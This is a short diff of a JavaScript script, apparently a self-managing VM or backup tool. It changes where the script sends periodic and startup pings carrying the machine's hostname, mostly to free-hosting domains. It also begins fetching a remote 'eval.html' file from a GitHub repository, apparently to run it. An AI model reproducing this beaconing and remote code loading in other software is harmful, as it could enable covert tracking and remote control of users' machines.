@@ -1,9 +1,10 @@
 setTimeout(()=>start_auto_backup(),30*1000);
-set_interval(()=>xhr_get('http://qpe.000webhostapp.com/vm/ping?from='+os.hostname(),()=>{},()=>{}),60*1000);
 var nope=()=>{};
-xhr_get('http://qpe.000webhostapp.com/vm/on_start?from='+os.hostname(),nope,nope);
+set_interval(()=>get_hosts_by_type('backup').map(
+  e=>xhr_get('http://'+e+'/vm/ping?from='+os.hostname(),nope,nope)
+),60*1000);
+get_hosts_by_type('backup').map(e=>xhr_get('http://'+e+'/vm/on_start?from='+os.hostname(),nope,nope));
 xhr_get('http://adler.hol.es/vm/on_start?from='+os.hostname(),nope,nope);
-xhr_get('http://qap.atwebpages.com/vm/on_start?from='+os.hostname(),nope,nope);
 
 var fetch_other_file=()=>["eval.html"].map(fn=>xhr_get('https://raw.githubusercontent.com/gitseo/vm/master/'+fn+'?t='+rand(),
   data=>{
